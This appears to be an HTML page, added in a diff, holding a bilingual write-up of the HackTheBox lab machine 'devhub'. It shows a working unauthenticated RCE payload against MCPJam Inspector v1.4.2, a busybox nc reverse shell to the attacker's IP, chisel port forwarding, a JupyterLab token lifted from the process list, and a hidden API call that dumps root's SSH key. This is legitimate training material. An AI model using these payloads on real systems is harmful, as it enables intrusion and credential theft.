@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>devhub | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+    <style>
+        pre {
+            position: relative;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+            overflow-x: hidden;
+        }
+        pre::before {
+            content: attr(data-lang);
+            position: absolute;
+            top: 6px;
+            left: 12px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            opacity: 0.5;
+            font-family: 'Inter', sans-serif;
+        }
+        pre code {
+            display: block;
+            padding-top: 1.8rem !important;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        /* Syntax highlighting colors */
+        .kw { color: #d73a49; font-weight: bold; } /* keywords */
+        .fn { color: #6f42c1; } /* functions */
+        .st { color: #032f62; } /* strings */
+        .cm { color: #6a737d; font-style: italic; } /* comments */
+        .nb { color: #005cc5; } /* built-ins */
+        .op { color: #d73a49; } /* operators */
+        .va { color: #e36209; } /* variables */
+        .dt { color: #d73a49; } /* data types / decorators */
+        .nu { color: #005cc5; } /* numbers */
+        .key { color: #005cc5; } /* JSON keys */
+        .bool { color: #d73a49; } /* booleans */
+
+        [data-theme="dark"] .kw { color: #ff7b72; }
+        [data-theme="dark"] .fn { color: #d2a8ff; }
+        [data-theme="dark"] .st { color: #a5d6ff; }
+        [data-theme="dark"] .cm { color: #8b949e; }
+        [data-theme="dark"] .nb { color: #79c0ff; }
+        [data-theme="dark"] .op { color: #ff7b72; }
+        [data-theme="dark"] .va { color: #ffa657; }
+        [data-theme="dark"] .dt { color: #ff7b72; }
+        [data-theme="dark"] .nu { color: #79c0ff; }
+        [data-theme="dark"] .key { color: #79c0ff; }
+        [data-theme="dark"] .bool { color: #ff7b72; }
+    </style>
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">devhub</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <!-- ==================== ENGLISH ==================== -->
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine exposed three main services: SSH on port 22, an nginx web server on port 80 redirecting to <code>devhub.htb</code>, and an MCPJam Inspector instance on port 6274. The web application on port 80 provided information about the internal services running on the machine, including a reference to the MCPJam Inspector tool and an analytics environment.</p>
+
+                    <p>The MCPJam Inspector was running version <code>v1.4.2</code>, which is vulnerable to a known CVE that allows unauthenticated remote code execution through the <code>/api/mcp/connect</code> endpoint. By crafting a malicious JSON payload that specified <code>busybox nc</code> as the command to execute, I obtained a reverse shell as the <code>mcp-dev</code> user.</p>
+
+                    <p>From that foothold, I discovered an internal JupyterLab instance running on port 8888. The authentication token for this service was exposed in the process list, visible to any user on the system. After port-forwarding this service via chisel, I authenticated with the leaked token and spawned a terminal as the <code>analyst</code> user, obtaining the user flag.</p>
+
+                    <p>For privilege escalation, I analysed a Python API server (<code>server.py</code>) running as root on port 5000. The source code revealed hidden tools not listed in the public API, including <code>ops._admin_dump</code>, which could dump root's private SSH key. Using an API key found in the <code>analyst</code> user's home directory, I called this hidden endpoint to retrieve root's SSH private key and gained full root access.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> MCPJam Inspector CVE RCE (v1.4.2), JupyterLab token exposure via process list, Flask API analysis revealing hidden endpoints and credential/key dumping.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>I start with an <code>nmap</code> scan to identify open ports and services on the target:</p>
+
+                <pre data-lang="plaintext"><code>PORT      STATE  SERVICE  VERSION
+22/tcp    open   ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
+|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
+80/tcp    open   http     nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://devhub.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+6274/tcp  open   unknown
+| fingerprint-strings:
+|   GetRequest:
+|     HTTP/1.1 200 OK
+|     content-type: text/html; charset=utf-8
+|     &lt;title&gt;MCPJam Inspector&lt;/title&gt;</code></pre>
+
+                <p>Three ports are open. Port 80 runs <code>nginx</code> and redirects to <code>devhub.htb</code>, so I add that hostname to <code>/etc/hosts</code>. Port 6274 is particularly interesting — the nmap fingerprint already reveals it's serving an HTML page titled <strong>MCPJam Inspector</strong>.</p>
+
+                <h2>Web Enumeration</h2>
+                <p>Navigating to the web application on port 80, I find information about the services running on the machine, including references to the MCPJam Inspector on port 6274 and an internal analytics environment:</p>
+                <p><img src="./media/image4.png" alt="DevHub web application showing information about running services including MCPJam Inspector and analytics environment" /></p>
+                <p><img src="./media/image2.png" alt="DevHub service listing page showing detailed information about the MCPJam and analytics services" /></p>
+
+                <h2>MCPJam Inspector - CVE RCE</h2>
+                <p>Visiting port 6274 directly, I see the MCPJam Inspector interface. Checking the settings, I identify the version as <code>v1.4.2</code>. I've already exploited this exact version on a previous machine (<a href="https://kerdw.github.io/machines/kobold/index.html">Kobold</a>), where I found this straightforward PoC: <a href="https://github.com/advisories/GHSA-232v-j27c-5pp6">GHSA-232v-j27c-5pp6</a>.</p>
+
+                <p>The vulnerability allows unauthenticated remote code execution through the <code>/api/mcp/connect</code> endpoint. First, I verify that I can reach my machine by issuing a simple <code>curl</code> command through the vulnerable API:</p>
+
+                <pre data-lang="bash"><code>└─$ <span class="nb">curl</span> http://devhub.htb:6274/api/mcp/connect \
+  --header <span class="st">"Content-Type: application/json"</span> \
+  --data <span class="st">'{"serverConfig":{"command":"curl","args":["10.10.14.104"],"env":{}},"serverId":"mytest"}'</span></code></pre>
+
+                <p>The response indicates a connection error (expected, since <code>curl</code> fetches a page and exits), but my HTTP server confirms the target connected back to me:</p>
+
+                <pre data-lang="bash"><code>└─$ <span class="nb">python3</span> -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.10.225 - <span class="st">"GET / HTTP/1.1"</span> 200 -</code></pre>
+
+                <p>With command execution confirmed, I send a reverse shell using <code>busybox nc</code>:</p>
+
+                <pre data-lang="bash"><code>└─$ <span class="nb">curl</span> http://devhub.htb:6274/api/mcp/connect \
+  --header <span class="st">"Content-Type: application/json"</span> \
+  --data <span class="st">'{"serverConfig":{"command":"busybox","args":["nc", "10.10.14.104", "443", "-e", "sh"],"env":{}},"serverId":"mytest"}'</span></code></pre>
+
+                <p>And I gain access as the <code>mcp-dev</code> user.</p>
+
+                <h2>Enumeration as mcp-dev</h2>
+                <p>I find some secrets in a <code>.env.production</code> file, though they don't appear directly exploitable at this point:</p>
+
+                <pre data-lang="bash"><code><span class="nb">cat</span> .env.production
+<span class="va">VITE_CONVEX_URL</span>=https://outstanding-fennec-304.convex.cloud
+<span class="va">CONVEX_URL</span>=https://outstanding-fennec-304.convex.cloud
+<span class="va">VITE_WORKOS_CLIENT_ID</span>=client_01K4C1TVPBE7JTBFQJF9SDW9P9
+<span class="va">VITE_WORKOS_REDIRECT_URI</span>=mcpjam://oauth/callback
+<span class="va">CONVEX_HTTP_URL</span>=https://outstanding-fennec-304.convex.site
+<span class="va">ENVIRONMENT</span>=production
+<span class="va">VITE_DISABLE_POSTHOG_LOCAL</span>=false</code></pre>
+
+                <p>Listing <code>/home</code>, I can see another user called <code>analyst</code>:</p>
+
+                <pre data-lang="plaintext"><code>drwxr-x--- 9 analyst analyst 4.0K May 27 12:22 analyst
+drwxr-x--- 4 mcp-dev mcp-dev 4.0K May 27 12:22 mcp-dev</code></pre>
+
+                <p>Under <code>/opt/opsmcp</code>, there's a Python script I cannot read yet as <code>mcp-dev</code>:</p>
+
+                <pre data-lang="plaintext"><code>-rw-r----- 1 analyst analyst 5.9K Mar 16 21:49 server.py</code></pre>
+
+                <p>Checking for internal listening services, I find ports <code>5000</code> and <code>8888</code> open locally. Port 8888 corresponds to the analytics environment mentioned on the port 80 web page, and port 5000 seems to be the <code>server.py</code> API:</p>
+
+                <pre data-lang="plaintext"><code>tcp  LISTEN  0  128  127.0.0.1:5000  0.0.0.0:*
+tcp  LISTEN  0  128  127.0.0.1:8888</code></pre>
+
+                <pre data-lang="bash"><code>mcp-dev@devhub:~$ <span class="nb">curl</span> localhost:5000
+{<span class="key">"auth"</span>:<span class="st">"Required - X-API-Key header"</span>,<span class="key">"endpoints"</span>:[<span class="st">"/tools/list"</span>,<span class="st">"/tools/call"</span>,<span class="st">"/health"</span>],<span class="key">"server"</span>:<span class="st">"OPSMCP"</span>,<span class="key">"status"</span>:<span class="st">"operational"</span>,<span class="key">"version"</span>:<span class="st">"2.1.0"</span>}</code></pre>
+
+                <h2>JupyterLab Token Exposure</h2>
+                <p>Running <code>ps</code> with full command-line output reveals that the <code>analyst</code> user is executing JupyterLab on port 8888, and critically, the <strong>authentication token is visible in the process arguments</strong>:</p>
+
+                <pre data-lang="bash"><code>mcp-dev@devhub:~$ <span class="nb">ps</span> -fauxww | grep analyst
+analyst  1104  0.1  2.4 182524 96440 ?  Ss  10:35  0:05 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=<span class="va">a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7</span> --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
+root     1110  0.0  0.7  37376 28768 ?  Ss  10:35  0:00 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py</code></pre>
+
+                <p>I also note that <code>server.py</code> is running as <strong>root</strong>, which will become relevant for privilege escalation.</p>
+
+                <p>To access the JupyterLab interface from my browser, I transfer <code>chisel</code> to the victim machine and set up port forwarding:</p>
+
+                <pre data-lang="bash"><code><span class="cm"># Attacker machine</span>
+└─$ ./chisel server -p 1234 --reverse
+
+<span class="cm"># Victim machine</span>
+mcp-dev@devhub:~$ ./chisel client 10.10.14.104:1234 R:8888:127.0.0.1:8888</code></pre>
+
+                <p>Navigating to <code>http://localhost:8888</code> in my browser, I see the JupyterLab login interface requesting a token:</p>
+                <p><img src="./media/image3.png" alt="JupyterLab login interface with a token input field for authentication" /></p>
+
+                <p>Since I already have the token from the process list, I enter it and gain full access to JupyterLab.</p>
+
+                <h2>Lateral Movement to analyst</h2>
+                <p>From within JupyterLab, I can spawn a terminal directly as the <code>analyst</code> user:</p>
+                <p><img src="./media/image1.png" alt="JupyterLab terminal spawned as the analyst user showing available shell options" /></p>
+
+                <p>I retrieve the user flag from here. To establish persistence, I simply add my SSH public key to the <code>analyst</code> user's <code>~/.ssh/authorized_keys</code> file through the JupyterLab terminal, then connect via SSH for a proper shell.</p>
+
+                <h2>Privilege Escalation - API Analysis and Credential Exposure</h2>
+                <p>Once logged in as <code>analyst</code> via SSH, I find an interesting file in the home directory:</p>
+
+                <pre data-lang="bash"><code>analyst@devhub:~$ <span class="nb">cat</span> .opsmcp_key
+opsmcp_secret_key_4f5a6b7c8d9e0f1a</code></pre>
+
+                <p>This is the API key for the OPSMCP server running as root on port 5000. Now that I'm <code>analyst</code>, I can also read the <code>server.py</code> source code at <code>/opt/opsmcp/server.py</code>. I can quickly test the API key works by listing available tools:</p>
+
+                <pre data-lang="bash"><code><span class="nb">curl</span> -X POST localhost:5000/tools/call \
+  -H <span class="st">"X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"</span> \
+  -H <span class="st">"Content-Type: application/json"</span> \
+  -d <span class="st">'{"name": "ops.list_services"}'</span></code></pre>
+
+                <pre data-lang="json"><code>{<span class="key">"services"</span>:[
+  {<span class="key">"name"</span>:<span class="st">"nginx"</span>,<span class="key">"pid"</span>:<span class="nu">1234</span>,<span class="key">"status"</span>:<span class="st">"running"</span>},
+  {<span class="key">"name"</span>:<span class="st">"opsmcp"</span>,<span class="key">"pid"</span>:<span class="nu">5678</span>,<span class="key">"status"</span>:<span class="st">"running"</span>},
+  {<span class="key">"name"</span>:<span class="st">"jupyter"</span>,<span class="key">"pid"</span>:<span class="nu">9012</span>,<span class="key">"status"</span>:<span class="st">"running"</span>},
+  {<span class="key">"name"</span>:<span class="st">"mcpjam"</span>,<span class="key">"pid"</span>:<span class="nu">3456</span>,<span class="key">"status"</span>:<span class="st">"running"</span>}
+]}</code></pre>
+
+                <h3>Analysing server.py</h3>
+                <p>The source code of the API server reveals the full picture. Below is the relevant content (I've removed the implementations of the non-critical visible tools for brevity — they were <code>ops.system_status</code>, <code>ops.list_services</code>, <code>ops.check_disk</code>, and <code>ops.view_logs</code>):</p>
+
+                <pre data-lang="python"><code><span class="cm">#!/usr/bin/env python3</span>
+<span class="st">"""
+OPSMCP - Operations MCP Server
+Internal tool for system operations management
+"""</span>
+<span class="kw">from</span> flask <span class="kw">import</span> Flask, jsonify, request
+<span class="kw">import</span> os
+
+app = <span class="fn">Flask</span>(<span class="va">__name__</span>)
+
+<span class="cm"># API Key for authentication</span>
+<span class="va">VALID_API_KEY</span> = <span class="st">"opsmcp_secret_key_4f5a6b7c8d9e0f1a"</span>
+
+<span class="cm"># Registered tools (visible)</span>
+<span class="va">VISIBLE_TOOLS</span> = {
+    <span class="st">"ops.system_status"</span>: {
+        <span class="st">"description"</span>: <span class="st">"Get system status and health metrics"</span>,
+        <span class="st">"parameters"</span>: {}
+    },
+    <span class="st">"ops.list_services"</span>: {
+        <span class="st">"description"</span>: <span class="st">"List running services"</span>,
+        <span class="st">"parameters"</span>: {}
+    },
+    <span class="st">"ops.check_disk"</span>: {
+        <span class="st">"description"</span>: <span class="st">"Check disk usage"</span>,
+        <span class="st">"parameters"</span>: {}
+    },
+    <span class="st">"ops.view_logs"</span>: {
+        <span class="st">"description"</span>: <span class="st">"View recent system logs"</span>,
+        <span class="st">"parameters"</span>: {<span class="st">"service"</span>: <span class="st">"string"</span>}
+    }
+}
+
+<span class="cm"># Hidden tools (not in /tools/list but callable)</span>
+<span class="va">HIDDEN_TOOLS</span> = {
+    <span class="st">"ops._admin_dump"</span>: {
+        <span class="st">"description"</span>: <span class="st">"Emergency credential dump - INTERNAL ONLY"</span>,
+        <span class="st">"parameters"</span>: {<span class="st">"target"</span>: <span class="st">"string"</span>, <span class="st">"confirm"</span>: <span class="st">"boolean"</span>}
+    },
+    <span class="st">"ops._debug_mode"</span>: {
+        <span class="st">"description"</span>: <span class="st">"Enable debug mode"</span>,
+        <span class="st">"parameters"</span>: {}
+    }
+}
+
+<span class="va">ALL_TOOLS</span> = {**<span class="va">VISIBLE_TOOLS</span>, **<span class="va">HIDDEN_TOOLS</span>}
+
+<span class="kw">def</span> <span class="fn">check_auth</span>():
+    <span class="st">"""Check API key authentication"""</span>
+    api_key = request.headers.<span class="fn">get</span>(<span class="st">'X-API-Key'</span>, <span class="st">''</span>)
+    <span class="kw">return</span> api_key == <span class="va">VALID_API_KEY</span>
+
+<span class="dt">@app.route</span>(<span class="st">'/'</span>)
+<span class="kw">def</span> <span class="fn">index</span>():
+    <span class="kw">return</span> <span class="fn">jsonify</span>({
+        <span class="st">"server"</span>: <span class="st">"OPSMCP"</span>,
+        <span class="st">"version"</span>: <span class="st">"2.1.0"</span>,
+        <span class="st">"status"</span>: <span class="st">"operational"</span>,
+        <span class="st">"endpoints"</span>: [<span class="st">"/tools/list"</span>, <span class="st">"/tools/call"</span>, <span class="st">"/health"</span>],
+        <span class="st">"auth"</span>: <span class="st">"Required - X-API-Key header"</span>
+    })
+
+<span class="dt">@app.route</span>(<span class="st">'/tools/call'</span>, methods=[<span class="st">'POST'</span>])
+<span class="kw">def</span> <span class="fn">call_tool</span>():
+    <span class="kw">if not</span> <span class="fn">check_auth</span>():
+        <span class="kw">return</span> <span class="fn">jsonify</span>({<span class="st">"error"</span>: <span class="st">"Unauthorized"</span>}), <span class="nu">401</span>
+
+    data = request.<span class="fn">get_json</span>() <span class="kw">or</span> {}
+    tool_name = data.<span class="fn">get</span>(<span class="st">'name'</span>, <span class="st">''</span>)
+    args = data.<span class="fn">get</span>(<span class="st">'arguments'</span>, {})
+
+    <span class="kw">if</span> tool_name == <span class="st">"ops._admin_dump"</span>:
+        target = args.<span class="fn">get</span>(<span class="st">'target'</span>, <span class="st">''</span>)
+        confirm = args.<span class="fn">get</span>(<span class="st">'confirm'</span>, <span class="bool">False</span>)
+        <span class="kw">if not</span> confirm:
+            <span class="kw">return</span> <span class="fn">jsonify</span>({
+                <span class="st">"error"</span>: <span class="st">"Confirmation required"</span>,
+                <span class="st">"usage"</span>: <span class="st">"Set confirm=true to proceed"</span>,
+                <span class="st">"warning"</span>: <span class="st">"This dumps sensitive credentials"</span>
+            })
+        <span class="kw">if</span> target == <span class="st">"ssh_keys"</span>:
+            <span class="kw">try</span>:
+                <span class="kw">with</span> <span class="nb">open</span>(<span class="st">'/root/.ssh/id_rsa'</span>, <span class="st">'r'</span>) <span class="kw">as</span> f:
+                    key_data = f.<span class="fn">read</span>()
+                <span class="kw">return</span> <span class="fn">jsonify</span>({
+                    <span class="st">"target"</span>: <span class="st">"ssh_keys"</span>,
+                    <span class="st">"root_private_key"</span>: key_data,
+                    <span class="st">"note"</span>: <span class="st">"Emergency recovery key dump"</span>
+                })
+            <span class="kw">except</span> <span class="nb">Exception</span> <span class="kw">as</span> e:
+                <span class="kw">return</span> <span class="fn">jsonify</span>({<span class="st">"error"</span>: <span class="kw">f</span><span class="st">"Could not read key: {<span class="fn">str</span>(e)}"</span>})
+        <span class="kw">elif</span> target == <span class="st">"passwords"</span>:
+            <span class="kw">return</span> <span class="fn">jsonify</span>({
+                <span class="st">"target"</span>: <span class="st">"passwords"</span>,
+                <span class="st">"dump"</span>: {
+                    <span class="st">"root"</span>: <span class="st">"$6$rounds=656000$saltsalt$hashedpassword"</span>,
+                    <span class="st">"analyst"</span>: <span class="st">"JupyterN0tebook!2026"</span>,
+                    <span class="st">"mcp-dev"</span>: <span class="st">"Mcp!Insp3ct0r2026"</span>
+                }
+            })
+        <span class="kw">elif</span> target == <span class="st">"tokens"</span>:
+            <span class="kw">return</span> <span class="fn">jsonify</span>({
+                <span class="st">"target"</span>: <span class="st">"tokens"</span>,
+                <span class="st">"api_tokens"</span>: {
+                    <span class="st">"admin_token"</span>: <span class="st">"opsmcp_admin_7f3b9c2d1e4f5a6b"</span>,
+                    <span class="st">"service_token"</span>: <span class="st">"opsmcp_svc_8c9d0e1f2a3b4c5d"</span>
+                }
+            })
+        <span class="kw">else</span>:
+            <span class="kw">return</span> <span class="fn">jsonify</span>({
+                <span class="st">"error"</span>: <span class="st">"Invalid target"</span>,
+                <span class="st">"valid_targets"</span>: [<span class="st">"ssh_keys"</span>, <span class="st">"passwords"</span>, <span class="st">"tokens"</span>]
+            })
+
+<span class="kw">if</span> <span class="va">__name__</span> == <span class="st">'__main__'</span>:
+    app.<span class="fn">run</span>(host=<span class="st">'127.0.0.1'</span>, port=<span class="nu">5000</span>, debug=<span class="bool">False</span>)</code></pre>
+
+                <p>The key takeaways from this code are:</p>
+                <ul>
+                    <li>The API key is hardcoded as <code>VALID_API_KEY</code> — which matches the one found in <code>.opsmcp_key</code></li>
+                    <li>There are <strong>hidden tools</strong> defined in <code>HIDDEN_TOOLS</code> that are <strong>not returned</strong> by the <code>/tools/list</code> endpoint, but are still callable via <code>/tools/call</code></li>
+                    <li>The <code>ops._admin_dump</code> tool can dump SSH keys, passwords, and tokens. Since the server runs as <strong>root</strong>, it has access to <code>/root/.ssh/id_rsa</code></li>
+                </ul>
+
+                <p>The passwords and tokens returned by the <code>passwords</code> and <code>tokens</code> targets are not functional (the root password is a dummy hash, and the tokens don't grant additional access). However, the <code>ssh_keys</code> target reads the actual root private key from disk.</p>
+
+                <h3>Dumping Root's SSH Key</h3>
+                <p>I call the hidden <code>ops._admin_dump</code> tool with <code>target: ssh_keys</code> and <code>confirm: true</code>:</p>
+
+                <pre data-lang="bash"><code><span class="nb">curl</span> -X POST localhost:5000/tools/call \
+  -H <span class="st">"X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"</span> \
+  -H <span class="st">"Content-Type: application/json"</span> \
+  -d <span class="st">'{"name": "ops._admin_dump", "arguments": {"confirm": true, "target": "ssh_keys"}}'</span></code></pre>
+
+                <pre data-lang="json"><code>{<span class="key">"note"</span>:<span class="st">"Emergency recovery key dump"</span>,<span class="key">"root_private_key"</span>:<span class="st">"-----BEGIN OPENSSH PRIVATE KEY-----\nb3Blbn(...)"</span>}</code></pre>
+
+                <p>The API returns root's private SSH key. The key contains escaped newlines (<code>\n</code>), so I normalise it with <code>sed</code>:</p>
+
+                <pre data-lang="bash"><code>└─$ <span class="nb">echo</span> <span class="st">"-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+(...)
+JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=
+\n-----END OPENSSH PRIVATE KEY-----\n"</span> | <span class="nb">sed</span> <span class="st">'s/\\n/\n/g'</span>
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+(...)
+JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npKlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=
+-----END OPENSSH PRIVATE KEY-----</code></pre>
+
+                <p>I save this key to a file, set the correct permissions, and SSH in as root:</p>
+
+                <pre data-lang="bash"><code><span class="nb">chmod</span> 600 root_id_rsa
+<span class="nb">ssh</span> -i root_id_rsa root@devhub.htb</code></pre>
+
+                <p>I gain access as root and retrieve the system flag.</p>
+            </div>
+
+            <!-- ==================== SPANISH ==================== -->
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Proceso de explotación:</strong> La máquina objetivo exponía tres servicios principales: SSH en el puerto 22, un servidor web nginx en el puerto 80 que redirigía a <code>devhub.htb</code>, y una instancia de MCPJam Inspector en el puerto 6274. La aplicación web del puerto 80 proporcionaba información sobre los servicios internos que se ejecutaban en la máquina, incluyendo una referencia al MCPJam Inspector y un entorno de analítica.</p>
+
+                    <p>El MCPJam Inspector ejecutaba la versión <code>v1.4.2</code>, que es vulnerable a un CVE conocido que permite la ejecución remota de código sin autenticación a través del endpoint <code>/api/mcp/connect</code>. Elaborando un payload JSON malicioso que especificaba <code>busybox nc</code> como comando a ejecutar, obtuve una reverse shell como el usuario <code>mcp-dev</code>.</p>
+
+                    <p>Desde ese punto de apoyo, descubrí una instancia interna de JupyterLab ejecutándose en el puerto 8888. El token de autenticación de este servicio estaba expuesto en la lista de procesos, visible para cualquier usuario del sistema. Tras hacer port-forwarding de este servicio mediante chisel, me autentiqué con el token filtrado y abrí un terminal como el usuario <code>analyst</code>, obteniendo la flag de usuario.</p>
+
+                    <p>Para la escalada de privilegios, analicé un servidor API en Python (<code>server.py</code>) que se ejecutaba como root en el puerto 5000. El código fuente revelaba herramientas ocultas no listadas en la API pública, incluyendo <code>ops._admin_dump</code>, que podía volcar la clave SSH privada de root. Usando una API key encontrada en el directorio home del usuario <code>analyst</code>, llamé a este endpoint oculto para obtener la clave SSH privada de root y ganar acceso completo.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> MCPJam Inspector CVE RCE (v1.4.2), exposición del token de JupyterLab mediante la lista de procesos, análisis de API Flask revelando endpoints ocultos y volcado de credenciales/claves.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de <code>nmap</code> para identificar puertos abiertos y servicios en el objetivo:</p>
+
+                <pre data-lang="plaintext"><code>PORT      STATE  SERVICE  VERSION
+22/tcp    open   ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
+|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
+80/tcp    open   http     nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://devhub.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+6274/tcp  open   unknown
+| fingerprint-strings:
+|   GetRequest:
+|     HTTP/1.1 200 OK
+|     content-type: text/html; charset=utf-8
+|     &lt;title&gt;MCPJam Inspector&lt;/title&gt;</code></pre>
+
+                <p>Hay tres puertos abiertos. El puerto 80 ejecuta <code>nginx</code> y redirige a <code>devhub.htb</code>, así que añado ese hostname a <code>/etc/hosts</code>. El puerto 6274 es particularmente interesante — el fingerprint de nmap ya revela que está sirviendo una página HTML titulada <strong>MCPJam Inspector</strong>.</p>
+
+                <h2>Enumeración Web</h2>
+                <p>Navegando a la aplicación web del puerto 80, encuentro información sobre los servicios que se ejecutan en la máquina, incluyendo referencias al MCPJam Inspector del puerto 6274 y a un entorno de analítica interno:</p>
+                <p><img src="./media/image4.png" alt="Aplicación web DevHub mostrando información sobre los servicios en ejecución incluyendo MCPJam Inspector y el entorno de analítica" /></p>
+                <p><img src="./media/image2.png" alt="Página de listado de servicios de DevHub mostrando información detallada sobre MCPJam y el servicio de analítica" /></p>
+
+                <h2>MCPJam Inspector - CVE RCE</h2>
+                <p>Visitando directamente el puerto 6274, veo la interfaz de MCPJam Inspector. Comprobando los ajustes, identifico la versión como <code>v1.4.2</code>. Esta versión exacta ya la exploté recientemente en otra máquina (<a href="https://kerdw.github.io/machines/kobold/index.html">Kobold</a>), donde encontré esta PoC sencilla: <a href="https://github.com/advisories/GHSA-232v-j27c-5pp6">GHSA-232v-j27c-5pp6</a>.</p>
+
+                <p>La vulnerabilidad permite ejecución remota de código sin autenticación a través del endpoint <code>/api/mcp/connect</code>. Primero, verifico que puedo alcanzar mi máquina lanzando un simple comando <code>curl</code> a través de la API vulnerable:</p>
+
+                <pre data-lang="bash"><code>└─$ <span class="nb">curl</span> http://devhub.htb:6274/api/mcp/connect \
+  --header <span class="st">"Content-Type: application/json"</span> \
+  --data <span class="st">'{"serverConfig":{"command":"curl","args":["10.10.14.104"],"env":{}},"serverId":"mytest"}'</span></code></pre>
+
+                <p>La respuesta indica un error de conexión (esperable, ya que <code>curl</code> descarga la página y termina), pero mi servidor HTTP confirma que el objetivo se ha conectado de vuelta:</p>
+
+                <pre data-lang="bash"><code>└─$ <span class="nb">python3</span> -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.10.225 - <span class="st">"GET / HTTP/1.1"</span> 200 -</code></pre>
+
+                <p>Con la ejecución de comandos confirmada, me envío una reverse shell usando <code>busybox nc</code>:</p>
+
+                <pre data-lang="bash"><code>└─$ <span class="nb">curl</span> http://devhub.htb:6274/api/mcp/connect \
+  --header <span class="st">"Content-Type: application/json"</span> \
+  --data <span class="st">'{"serverConfig":{"command":"busybox","args":["nc", "10.10.14.104", "443", "-e", "sh"],"env":{}},"serverId":"mytest"}'</span></code></pre>
+
+                <p>Y gano acceso como el usuario <code>mcp-dev</code>.</p>
+
+                <h2>Enumeración como mcp-dev</h2>
+                <p>Encuentro algunos secretos en un archivo <code>.env.production</code>, aunque no parecen directamente explotables por ahora:</p>
+
+                <pre data-lang="bash"><code><span class="nb">cat</span> .env.production
+<span class="va">VITE_CONVEX_URL</span>=https://outstanding-fennec-304.convex.cloud
+<span class="va">CONVEX_URL</span>=https://outstanding-fennec-304.convex.cloud
+<span class="va">VITE_WORKOS_CLIENT_ID</span>=client_01K4C1TVPBE7JTBFQJF9SDW9P9
+<span class="va">VITE_WORKOS_REDIRECT_URI</span>=mcpjam://oauth/callback
+<span class="va">CONVEX_HTTP_URL</span>=https://outstanding-fennec-304.convex.site
+<span class="va">ENVIRONMENT</span>=production
+<span class="va">VITE_DISABLE_POSTHOG_LOCAL</span>=false</code></pre>
+
+                <p>Listando <code>/home</code>, puedo ver otro usuario llamado <code>analyst</code>:</p>
+
+                <pre data-lang="plaintext"><code>drwxr-x--- 9 analyst analyst 4.0K May 27 12:22 analyst
